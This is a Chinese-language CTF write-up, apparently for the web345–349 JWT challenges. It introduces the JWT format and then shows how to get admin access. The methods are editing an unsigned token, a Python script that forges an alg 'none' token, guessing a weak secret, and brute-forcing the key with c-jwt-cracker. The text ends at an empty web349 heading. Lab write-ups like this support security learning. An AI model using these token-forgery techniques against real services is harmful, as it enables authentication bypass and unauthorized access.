## JWT介绍

JWT 全称 JSON Web Token。

JWT由头部(Header)、有效载荷(Payload)、签名(Signature)三部分组成

头部(Header)包含alg(签名算法)和typ(令牌类型)示例如下：

```
{
"alg": "HS256",
"typ": "JWT"
}
```

payload示例：

```
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}
```

signature（签名）：

将头部和payload分别进行base64编码，用`.`连接起来组成字符串

将字符串通过header中声明的签名算法进行加盐secret组合加密，就构成了jwt的第三部分

三部分连接起来就是jwt了

## web345

```
eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3MDIwMTgzNjcsImV4cCI6MTcwMjAyNTU2NywibmJmIjoxNzAyMDE4MzY3LCJzdWIiOiJ1c2VyIiwianRpIjoiMDA5NDRkOWQzYmI3MjNhMDQ2YzI1NTdhMTYyNjZmNzIifV0
```

base64解码将user改成admin

## web346

得到cookie里的jwt，放到[jwt.io](https://jwt.io/)，发现有算法加密

利用jwt的一个漏洞，修改alg字段为none，这样的话后端就不会进行签名校验

```python
import jwt
Payload = {
  "iss": "admin",
  "iat": 1702018676,
  "exp": 1702025876,
  "nbf": 1702018676,
  "sub": "admin",
  "jti": "5d4d83011c4baefdbb5e34b9553dbb38"
}

headers = {
  "alg": "none",
  "typ": "JWT"
}
json_web_token = jwt.encode(payload=Payload,key="",algorithm="none",headers=headers)
print(json_web_token)
```

## web347

提示是弱口令，发现123456是密钥

![image-20231208160429129](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231208160429129.png)

## web348

用工具进行爆破[c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)

![image-20231208160813615](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231208160813615.png)

密钥是aaab，然后跟上面一样

## web349

